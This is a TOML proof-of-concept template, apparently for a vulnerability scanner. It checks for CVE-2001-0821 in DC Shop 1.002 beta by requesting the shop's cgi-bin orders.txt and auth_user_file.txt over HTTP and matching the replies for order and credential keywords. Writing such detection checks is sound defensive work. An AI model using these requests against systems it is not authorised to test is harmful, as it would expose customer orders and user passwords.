[info]
author = "ave"
description = "检测 DC Shop 1.002 beta 默认配置将敏感文件放置在 cgi-bin 目录中，攻击者可通过 HTTP GET 直接访问 orders.txt 和 auth_user_file.txt 泄露订单与用户凭证信息"
id = "POC-AVE-2001-0375"
name = "CVE-2001-0821 PoC"
severity = "medium"
tags = ["ave-2001-0375"]
vuln_id = [
    "CVE-2001-0821",
    "AVE-2001-0375",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/DCShop/Orders/orders.txt"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "order",
    "Order",
    "ORDER",
    "price",
    "Price",
    "quantity",
    "Quantity",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/DCShop/Auth_data/auth_user_file.txt"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "user",
    "User",
    "password",
    "Password",
    ":",
    "admin",
    "Admin",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
